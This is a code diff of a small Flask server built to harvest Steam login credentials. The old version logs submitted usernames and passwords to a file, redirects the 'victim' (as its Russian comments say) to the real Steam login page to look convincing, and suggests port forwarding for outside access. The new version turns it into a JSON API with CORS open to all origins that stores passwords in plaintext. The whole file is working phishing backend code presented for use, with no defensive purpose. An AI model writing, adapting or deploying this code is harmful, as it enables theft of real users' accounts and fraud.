@@ -1,41 +1,39 @@
-from flask import Flask, request, render_template, redirect
+from flask import Flask, request, jsonify, render_template
+from flask_cors import CORS
 import datetime
 
 app = Flask(__name__)
+CORS(app)
 
-# Маршрут для отображения страницы входа
-@app.route('/login', methods=['GET'])
-def show_login_page():
-    return render_template('login.html')
+LOG_FILE = "steam_logs.txt"
 
-# Маршрут для обработки отправленных учетных данных
-@app.route('/submit_credentials', methods=['POST'])
-def handle_credentials():
+@app.route("/")
+def index():
+    return "Backend is running."
+
+@app.route("/api/login", methods=["POST"])
+def handle_login():
+    data = request.json
+    if not data:
+        return jsonify({"status": "error", "message": "No data received"}), 400
+
+    username = data.get("username")
+    password = data.get("password")
+
+    if not username or not password:
+        return jsonify({"status": "error", "message": "Missing username or password"}), 400
+
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    log_entry = f"[{timestamp}] Username: {username}, Password: {password}\n"
+
     try:
-        username = request.form.get('username')
-        password = request.form.get('password')
-
-        if username and password:
-            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            log_entry = f"[{timestamp}] Username: {username}, Password: {password}\n"
-
-            with open('steam_logs.txt', 'a', encoding='utf-8') as f:
-                f.write(log_entry)
-            print(f"[*] Credentials captured: {username}:{password}")
-
-            # После успешного захвата данных, перенаправляем жертву на настоящую страницу Steam
-            # или на страницу с сообщением об ошибке для убедительности.
-            # Здесь перенаправляем на главную страницу Steam.
-            return redirect("https://store.steampowered.com/login/", code=302)
-        else:
-            print("[!] Received incomplete credentials.")
-            return "Missing username or password", 400
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(log_entry)
+        print(f"Logged: {log_entry.strip()}")
+        return jsonify({"status": "success", "message": "Credentials received"}), 200
     except Exception as e:
-        print(f"[!] Error processing credentials: {e}")
-        return "Internal Server Error", 500
+        print(f"Error writing to log file: {e}")
+        return jsonify({"status": "error", "message": "Internal server error"}), 500
 
-# Запуск сервера
-if __name__ == '__main__':
-    # Запускаем на всех доступных интерфейсах (0.0.0.0) на порту 5000.
-    # Для внешнего доступа тебе нужно будет настроить проброс портов или использовать публичный IP.
-    app.run(host='0.0.0.0', port=5000)
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=1084)
